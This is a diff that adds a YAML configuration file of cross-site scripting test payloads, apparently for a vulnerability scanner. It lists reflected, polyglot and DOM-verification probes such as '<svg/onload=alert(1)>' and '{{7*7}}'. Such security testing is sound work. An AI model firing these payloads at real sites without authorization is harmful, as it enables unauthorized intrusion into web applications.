@@ -1,0 +1,29 @@
+# XSS Payloads
+# Edit this file to add or remove payloads without touching source code.
+
+payloads:
+  # Standard reflected / URL-injection payloads
+  reflected:
+    - '<svg/onload=alert(1)>'
+    - '"><img src=x onerror=alert(1)>'
+    - "';alert(1)//"
+    - '{{7*7}}'
+    - '${7*7}'
+    - '<script>alert(1)</script>'
+    - '"><script>alert(1)</script>'
+    - "javascript:alert(1)"
+
+  # Context-breaking polyglots (HTML, JS string, JS template literal,
+  # JS event handler, CSS expression)
+  polyglot:
+    - '"><svg/onload=alert(1)>'
+    - "';alert(1)//"
+    - '${alert(1)}'
+    - ' " onfocus=alert(1) autofocus= '
+    - 'expression(alert(1))'
+
+  # Payloads used specifically for DOM XSS verification
+  dom:
+    - '<img src=x onerror=window.__bbh_xss=1>'
+    - '"><img src=x onerror=window.__bbh_xss=1>'
+    - "javascript:window.__bbh_xss=1"
